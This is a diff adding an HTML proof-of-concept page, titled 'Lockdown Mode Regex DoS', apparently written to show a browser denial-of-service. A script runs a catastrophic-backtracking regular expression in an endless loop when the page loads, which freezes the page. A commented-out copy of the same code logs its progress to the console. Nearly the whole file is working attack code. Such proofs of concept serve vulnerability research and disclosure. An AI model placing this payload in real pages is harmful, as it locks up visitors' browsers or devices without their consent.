@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head><title>LM Regex DoS PoC</title></head>
+<body>
+<!--
+(function() {
+  var start = performance.now();
+  var i = 0;
+  
+  function freeze() {
+    /^(a+)+$/.test('a'.repeat(30) + 'b');
+    i++;
+    if (i % 10 === 0) {
+      console.log('iteration ' + i + ' total: ' + Math.round(performance.now() - start) + 'ms');
+    }
+    setTimeout(freeze, 0);
+  }
+  
+  console.log('Lockdown Mode Regex DoS - Starting...');
+  console.log('If this runs past 60 seconds, DoS is confirmed.');
+  freeze();
+})();
+
+  -->
+  
+<h1>Lockdown Mode Regex DoS</h1>
+<p id="status">Starting...</p>
+<script>
+(function() {
+  var start = performance.now();
+  var i = 0;
+  
+  function freeze() {
+    /^(a+)+$/.test('a'.repeat(30) + 'b');
+    i++;
+    var ms = Math.round(performance.now() - start);
+    if (i % 10 === 0) {
+      document.getElementById('status').textContent = 
+        'Iteration ' + i + ' - Total: ' + ms + 'ms - Page frozen';
+    }
+    setTimeout(freeze, 0);
+  }
+  
+  freeze();
+})();
+</script>
+</body>
+</html>
